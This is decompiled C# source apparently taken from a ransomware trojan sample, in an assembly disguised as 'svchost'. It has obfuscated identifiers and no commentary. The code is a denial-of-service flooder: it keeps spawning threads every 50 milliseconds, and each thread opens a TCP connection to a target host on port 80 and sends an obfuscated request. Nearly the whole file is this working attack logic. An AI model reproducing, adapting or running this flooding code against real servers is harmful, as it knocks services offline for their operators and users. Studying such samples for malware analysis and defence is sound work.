// Decompiled with JetBrains decompiler
// Type: 
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

internal sealed class \u0008
{
  public static Thread \u0002;
  public static string \u0003;
  public static bool \u0005;

  public static void \u0002()
  {
    \u0008.\u0005 = true;
    \u0008.\u0002 = new Thread(new ThreadStart(\u0008.\u0005));
    \u0008.\u0002.Start();
  }

  public static void \u0003()
  {
    \u0008.\u0005 = false;
    \u0008.\u0002.Abort();
  }

  public static void \u0005()
  {
    ThreadStart threadStart = (ThreadStart) null;
    \u0008.\u0002 obj = new \u0008.\u0002();
    ThreadStart start = (ThreadStart) null;
    obj.\u0002 = new List<TcpClient>();
    while (\u0008.\u0005)
    {
      if (start == null)
      {
        if (threadStart == null)
          threadStart = new ThreadStart(obj.\u0002);
        start = threadStart;
      }
      new Thread(start).Start();
      Thread.Sleep(50);
    }
    foreach (TcpClient tcpClient in obj.\u0002)
    {
      try
      {
        tcpClient.GetStream().Dispose();
      }
      catch (Exception ex)
      {
      }
    }
  }

  private sealed class \u0002
  {
    public List<TcpClient> \u0002;

    public void \u0002()
    {
      TcpClient tcpClient = new TcpClient();
      this.\u0002.Add(tcpClient);
      try
      {
        tcpClient.Connect(\u0008.\u0003, 80);
        StreamWriter streamWriter = new StreamWriter((Stream) tcpClient.GetStream());
        streamWriter.Write(\u0005\u2003.\u0002(1067757289) + \u0008.\u0003 + \u0005\u2003.\u0002(1067757263));
        streamWriter.Flush();
      }
      catch (Exception ex)
      {
      }
    }
  }
}
